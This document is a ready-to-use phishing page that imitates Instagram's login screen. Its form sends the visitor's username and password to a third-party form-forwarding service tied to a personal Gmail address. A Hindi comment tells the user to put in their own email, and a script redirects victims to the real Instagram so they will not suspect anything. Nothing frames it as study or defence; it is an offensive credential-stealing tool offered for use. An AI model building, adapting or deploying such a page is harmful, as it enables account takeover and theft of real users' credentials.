<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 50px; background: white; }
        input { display: block; margin: 10px auto; padding: 10px; width: 200px; border: 1px solid #ccc; border-radius: 3px; }
        button { padding: 10px 20px; background: #0095f6; color: white; border: none; cursor: pointer; border-radius: 4px; }
        h2 { color: #262626; }
    </style>
</head>
<body>
    <!-- Niche action mein apna email daalna hai -->
    <form action="https://formsubmit.co/armangagat081@gmail.com" method="POST">
        <h2>Instagram</h2>
        <input type="text" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log in</button>
    </form>
    
    <script>
        // Redirect to real Instagram after 1 second so they don't suspect
        setTimeout(function(){
            window.location.href = "https://www.instagram.com";
        }, 1000);
    </script>
</body>
</html>
